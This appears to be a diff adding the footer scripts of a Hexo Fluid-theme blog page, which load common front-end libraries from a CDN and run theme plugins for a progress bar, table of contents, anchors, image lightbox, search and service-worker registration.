+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>
